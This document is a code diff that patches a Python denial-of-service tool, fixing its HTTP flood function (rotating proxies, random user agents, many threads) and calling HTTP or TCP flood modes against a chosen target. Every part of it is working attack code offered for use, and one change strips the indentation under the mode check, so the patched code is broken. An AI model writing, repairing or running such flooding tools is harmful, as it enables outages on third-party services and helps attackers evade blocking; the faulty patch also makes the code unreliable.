@@ -39,7 +39,7 @@ def analyze_response(response):
         print(f"\033[35m[UNKNOWN] {response.url} ({response.status_code})\033[0m")
         failure_count += 1
 
-def perform_http_flood(target, port, threads, proxy_file, user_agents, timeout, retry):
+def perform_http_flood(target, port, threads, proxy_list, user_agents, timeout, retry):  # Fix: Changed proxy_file to proxy_list
     session = requests.Session()
     retry_strategy = Retry(total=retry, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
     adapter = HTTPAdapter(max_retries=retry_strategy)
@@ -51,9 +51,9 @@ def perform_http_flood(target, port, threads, proxy_file, user_agents, timeout, 
         while not exit_flag:
             try:
                 headers = {"User-Agent": random.choice(user_agents)}
-                proxy = random.choice(proxy_list) if proxy_list else None
+                proxy = random.choice(proxy_list) if proxy_list else None  # Fix: Using proxy_list instead of undefined variable
                 proxies = {"http": proxy, "https": proxy} if proxy else None
-                response = session.get(f"http://{target}:{port}", headers=headers, proxies=proxies, timeout=10)
+                response = session.get(f"http://{target}:{port}", headers=headers, proxies=proxies, timeout=timeout)
                 analyze_response(response)
             except requests.exceptions.RequestException:
                 print("\033[31m[ERROR] Connection timed out\033[0m")
@@ -70,6 +70,7 @@ def perform_http_flood(target, port, threads, proxy_file, user_agents, timeout, 
         t.join()
 
     print(f"\033[36m[RESULT] Successful requests: {success_count}, Failed requests: {failure_count}\033[0m")
+
 
 def perform_tcp_flood(target, port, threads, timeout):
     def flood():
@@ -136,9 +137,10 @@ def main():
             proxy_list = file.read().splitlines()
 
     if mode == "http":
-        perform_http_flood(target, port, threads, proxy_list, user_agents, timeout, retry)
-    elif mode == "tcp":
-        perform_tcp_flood(target, port, threads, timeout)
+    perform_http_flood(target, port, threads, proxy_list, user_agents, timeout, retry)  # Fix: Passing proxy_list instead of proxy_file
+elif mode == "tcp":
+    perform_tcp_flood(target, port, threads, timeout)
+
 
 if __name__ == "__main__":
     main()
